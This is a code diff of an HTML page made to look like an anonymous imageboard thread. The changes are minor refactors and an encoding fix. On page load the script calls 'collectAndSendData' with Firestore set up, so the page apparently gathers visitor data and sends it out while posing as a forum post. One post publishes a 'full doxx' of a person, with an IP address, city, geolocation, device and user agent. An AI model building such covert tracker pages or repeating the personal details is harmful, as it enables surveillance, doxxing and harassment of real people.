@@ -70,7 +70,7 @@
 
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
+        const analytics = getAnalytics(app);
         const db = getFirestore(app);
 
         console.log("Firebase initialized");
@@ -120,32 +120,37 @@ const analytics = getAnalytics(app);
             }
         }
 
-        window.onload = collectAndSendData;
+        window.onload = () => {
+            collectAndSendData();
 
-        function toggleImage(img) {
-            const isThumbnail = img.classList.contains('thumbnail');
-            const thumbnailImg = isThumbnail ? img : img.previousElementSibling;
-            const expandedImg = isThumbnail ? img.nextElementSibling : img;
-
-            if (isThumbnail) {
-                thumbnailImg.style.display = 'none';
-                expandedImg.style.display = 'block';
-            } else {
-                expandedImg.style.display = 'none';
-                thumbnailImg.style.display = 'block';
+            // Function to set custom text colors
+            function setCustomTextColor(color) {
+                const elements = document.querySelectorAll('.custom-color');
+                elements.forEach(element => {
+                    element.style.color = color;
+                });
             }
-        }
 
-        // Function to set custom text colors
-        function setCustomTextColor(color) {
-            const elements = document.querySelectorAll('.custom-color');
-            elements.forEach(element => {
-                element.style.color = color;
+            // Example: Set custom text color to blue
+            setCustomTextColor('#800001');
+
+            // Image toggle functionality
+            document.querySelectorAll('.thumbnail, .expanded-img').forEach(img => {
+                img.addEventListener('click', function() {
+                    const isThumbnail = img.classList.contains('thumbnail');
+                    const thumbnailImg = isThumbnail ? img : img.previousElementSibling;
+                    const expandedImg = isThumbnail ? img.nextElementSibling : img;
+
+                    if (isThumbnail) {
+                        thumbnailImg.style.display = 'none';
+                        expandedImg.style.display = 'block';
+                    } else {
+                        expandedImg.style.display = 'none';
+                        thumbnailImg.style.display = 'block';
+                    }
+                });
             });
-        }
-
-        // Example: Set custom text color to blue
-        setCustomTextColor('#800001');
+        };
     </script>
 </head>
 <body>
@@ -154,17 +159,17 @@ const analytics = getAnalytics(app);
 
     <div class="post">
         <div class="post-header"><span class="anonymous">Anonymous</span> ## Mod 09/02/13(Mon)17:58:33 No.17318579</div>
-        <img src="https://media.discordapp.net/attachments/1214301893153521818/1253909678816235591/IMG_9668.jpg?ex=667791e3&is=66764063&hm=43d884d58a0e3e97821168e26af55a0dc64a522549aa6416093c22ce1e260f6c&" alt="Image 1 Thumbnail" class="thumbnail" onclick="toggleImage(this)">
-        <img src="https://media.discordapp.net/attachments/1214301893153521818/1253909678816235591/IMG_9668.jpg?ex=667791e3&is=66764063&hm=43d884d58a0e3e97821168e26af55a0dc64a522549aa6416093c22ce1e260f6c&" alt="Image 1 Expanded" class="expanded-img" onclick="toggleImage(this)">
+        <img src="https://media.discordapp.net/attachments/1214301893153521818/1253909678816235591/IMG_9668.jpg?ex=667791e3&is=66764063&hm=43d884d58a0e3e97821168e26af55a0dc64a522549aa6416093c22ce1e260f6c&" alt="Image 1 Thumbnail" class="thumbnail">
+        <img src="https://media.discordapp.net/attachments/1214301893153521818/1253909678816235591/IMG_9668.jpg?ex=667791e3&is=66764063&hm=43d884d58a0e3e97821168e26af55a0dc64a522549aa6416093c22ce1e260f6c&" alt="Image 1 Expanded" class="expanded-img">
         <p class="post-text custom-color">hello thank for watching hello thank you for watching hello thank you for watching:33</p>
     </div>
 
     <div class="post">
         <div class="post-header"><span class="anonymous">Anonymous</span> ## Mod 09/02/13(Mon)18:00:00 No.17318580</div>
-        <img src="https://i.imgur.com/EHKQJOA.jpg" alt="Image 2 Thumbnail" class="thumbnail" onclick="toggleImage(this)">
-        <img src="https://i.imgur.com/EHKQJOA.jpg" alt="Image 2 Expanded" class="expanded-img" onclick="toggleImage(this)">
+        <img src="https://i.imgur.com/EHKQJOA.jpg" alt="Image 2 Thumbnail" class="thumbnail">
+        <img src="https://i.imgur.com/EHKQJOA.jpg" alt="Image 2 Expanded" class="expanded-img">
         <p class="post-text custom-color">snails full doxx: city
-"SC#o Paulo"
+"São Paulo"
 (string)
 date
 "2024-06-22"
@@ -173,7 +178,7 @@ device
 "iPhone"
 (string)
 geolocation
-"SC#o Paulo, Brazil"
+"São Paulo, Brazil"
 (string)
 ip
 "177.46.111.225"
@@ -188,8 +193,7 @@ time
 "03:05:38"
 (string)
 userAgent
-"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/13E148 Safari/604.2"
-(string)</p>
-    </div>
-</body>
-</html>
+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/13E148 Safari/604.2"</p>
+        </div>
+    </body>
+    </html>
